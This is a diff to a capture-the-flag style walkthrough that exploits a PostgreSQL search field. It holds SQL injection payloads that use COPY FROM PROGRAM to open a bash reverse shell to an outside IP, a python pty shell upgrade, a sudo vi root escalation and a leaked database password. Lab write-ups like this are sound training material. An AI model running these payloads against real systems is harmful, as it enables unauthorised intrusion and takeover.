@@ -11,6 +11,7 @@ Tools I used are:
 - Netcat
 - NMap
 - FTP
+- Dirbuster
 
 ## Let's begin
 
@@ -94,7 +95,7 @@ There is a search feature on the top right. There appears to be an injection opt
 
 I'll try to use sqlmap to see if this can get me some info.
 
-I'll use ZAP to capture the cookie data.
+I'll use firefox inspector to capture the cookie data that sqlmap requires.
 
 Looks like we have a PostgreSQL db, with possible injection here.
 
@@ -118,13 +119,13 @@ I then took a look at the tables in the public DB:
 
 ![bd82c049ecd9ff3fc0b5d754867d14a7.png](images/52366a7beb934eafb1c9c0e053c20b12.png)
 
-Then I could obtain the data in that table with the --dump sqlmap flag.
+Then I could obtain the data in that table with the `--dump` sqlmap flag.
 
 ![0c1c13af88dc0a61b6563356ecc75b3b.png](images/ff178f5c62ad41cd884920dd87c0b909.png)
 
 I tried a reverse shell, but that did not seem to work with sqlmap.
 
-Next I'll try get the user name and password ofr the db with the --user and --password flag in sqlmap
+Next I'll try get the user name and password ofr the db with the `--user` and `--password` flag in sqlmap
 
 ![004d2f7b21349506f6c32a642e20f986.png](images/a63a1e1597bc42b5a17e1a052b3efe81.png)
 
@@ -144,12 +145,15 @@ Now I will attempt to manually get a reverse shell, this article provides some i
 
 https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5 
 
-I ended up runing the following SQL Injection commands to get a reverse shell
+I ended up running the following SQL Injection commands directly into the search field of the website to get a reverse shell.
 
-DROP TABLE IF EXISTS cmd_exec;
-CREATE TABLE cmd\_exec(cmd\_output text);
+```
+'; DROP TABLE IF EXISTS cmd_exec; --
 
-COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.109/4444 0>&1"';
+'; CREATE TABLE cmd\_exec(cmd\_output text); --
+
+'; COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.109/4444 0>&1"'; --
+```
 
 This finally led to a remote shell
 
@@ -167,7 +171,7 @@ postgres P@s5w0rd!
 
 Note at this point I got kicked off, another user must have dropped my table or reset the box. So I had to redo the above attack again to re-obtain a shell.
 
-Now that I'm back in, I'll upgrade from a simple shell with python3 -c 'import pty; pty.spawn("/bin/sh")'
+Now that I'm back in, I'll upgrade from a simple shell with python3 -c `'import pty; pty.spawn("/bin/sh")'`
 
 ![1d6232cad372d13381beeadd0ac75b36.png](images/2aca0bc7ca804d18b98c4fa1b9d1e87a.png)
 
@@ -175,7 +179,7 @@ The user seems to have sudo access using vi, this can be easily exploited since 
 
 ![0adc6e11777949fd58880ab1c8f6fc2a.png](images/aa3973eb03654d4dbd372e2339d3d5e7.png)
 
-So I will run the above command as sudo, launching vi as root, then launch a shell with the following command in vi :!/bin/bash
+So I will run the above command as sudo, launching vi as root, then launch a shell with the following command in vi `:!/bin/bash`
 
 Now I have root access
 
